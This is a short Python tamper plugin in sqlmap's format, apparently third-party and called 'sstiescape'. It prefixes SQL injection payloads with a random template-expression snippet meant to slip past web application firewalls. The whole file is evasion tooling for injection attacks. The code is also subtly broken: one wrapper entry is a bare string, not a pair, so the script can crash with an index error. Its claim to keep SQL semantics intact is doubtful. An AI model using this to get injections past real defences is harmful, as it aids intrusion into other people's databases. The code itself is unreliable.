#!/usr/bin/env python
# JeevSQL Tamper: sstiescape - by Jeevraj
# Escapes payload through SSTI template syntax while preserving SQL semantics.
from lib.core.enums import PRIORITY
import random

__priority__ = PRIORITY.NORMAL

SSTI_WRAPPERS = [
    ('{{', '}}'),
    (''),
    ('#{', '}'),
    ('{%', '%}'),
    ('<#', '>'),
]

def dependencies(): pass

def tamper(payload, **kwargs):
    if not payload:
        return payload
    wrapper = random.choice(SSTI_WRAPPERS)
    # Prefix with innocuous SSTI that evaluates to empty to confuse template-context WAFs
    prefix = wrapper[0] + "''|lower" + wrapper[1]
    return prefix + payload
